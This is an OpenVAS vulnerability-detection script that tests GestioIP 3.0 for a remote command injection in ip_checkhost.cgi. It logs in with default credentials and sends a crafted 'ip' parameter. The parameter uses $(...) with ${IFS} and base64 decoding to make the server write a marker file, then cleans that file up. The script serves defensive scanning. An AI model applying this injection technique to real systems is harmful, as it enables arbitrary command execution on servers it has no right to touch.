###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_gestioip_ip_cmd_inj_vuln.nasl 5351 2017-02-20 08:03:12Z mwiegand $
#
# GestioIP 'gestioip/ip_checkhost.cgi' Remote Command Injection Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803953";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5351 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-02-20 09:03:12 +0100 (Mon, 20 Feb 2017) $");
  script_tag(name:"creation_date", value:"2013-10-11 19:37:30 +0530 (Fri, 11 Oct 2013)");
  script_name("GestioIP 'gestioip/ip_checkhost.cgi' Remote Command Injection Vulnerability");

  tag_summary =
"This host is installed with GestioIP and is prone to remote command injection
vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and create a file.
Exploit works only when GestioIP is installed with default credentials";

  tag_insight =
"An error exists in ip_checkhost.cgi script which fails to properly sanitize
user-supplied input to 'ip' parameter before using it";

  tag_impact =
"Successful exploitation will allow remote attackers to inject and execute
arbitrary shell commands.

Impact Level: Application/System";

  tag_affected =
"GestioIP version 3.0, Other versions may also be affected.";

  tag_solution =
"Upgrade to version 3.1 or later,
For updates refer to www.gestioip.net";

  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);

  script_xref(name : "URL" , value : "http://secunia.com/community/advisories/55091");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/gestioip-remote-command-execution");
  script_summary("Check GestioIP is vulnerable to command injection");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  exit(0);
}


include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
buf = "";
file = "";
exploit = "";
userpass = "";
userpass64 = "";
exploit_rm = "";
exploit_url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Request to check GestioIP installed
url = '/gestioip/';
req = http_get(item:url, port:port);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

## Check product and  authentication bypass
if("401 Authorization Required" >< buf &&
   'WWW-Authenticate: Basic realm="GestioIP"' ><buf)
{
  exploit = base64(str: "OpenVas Exploit");
  userpass = "gipadmin:" + "";
  userpass64 = base64(str: userpass);
  file = string("ov-upload-test-", rand_str(length:5), ".txt");

  exploit_url = "ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}" + exploit +
                "|base64${IFS}--decode|tee${IFS}" + file + "):0000:000"+
                "0:0000:0000:0004&hostname=fds&client_id=1&ip_version=";

  exploit_rm = "ip_checkhost.cgi?ip=2607:f0d0:$(echo${IFS}|base64${IFS}"+
               "--decode|tee${IFS}" + file + "):0000:0000:0000:0000:000"+
                                "4&hostname=fds&client_id=1&ip_version=";

  ## construct the request with username ,password and the exploit
  req = string("GET ",url,exploit_url," HTTP/1.0\r\n",
               "Host: ", get_host_name(),"\r\n",
               "Authorization: Basic ",userpass64,"\r\n\r\n");
  buf = http_keepalive_send_recv(port:port, data:req);

  ## Request to check if vulnerability is exploited
  req = string("GET ",url,file," HTTP/1.0\r\n",
               "Host: ", get_host_name(),"\r\n",
               "Authorization: Basic ",userpass64,"\r\n\r\n");
  buf = http_keepalive_send_recv(port:port, data:req);

  ## Remove the exploit string from the file
  req = string("GET ",url,exploit_rm," HTTP/1.0\r\n",
               "Host: ", get_host_name(),"\r\n",
               "Authorization: Basic ",userpass64,"\r\n\r\n");
  http_keepalive_send_recv(port:port, data:req);

  ## Confirm the vulnerability
  if(buf && "OpenVas Exploit" ><  buf)
  {
    report = 'Scanner has created a file ' + file +
               ' to check the vulnerability. Please remove'+
                          ' this file as soon as possible.';
    security_message(port:port, data:report);
    exit(0);
  }
}
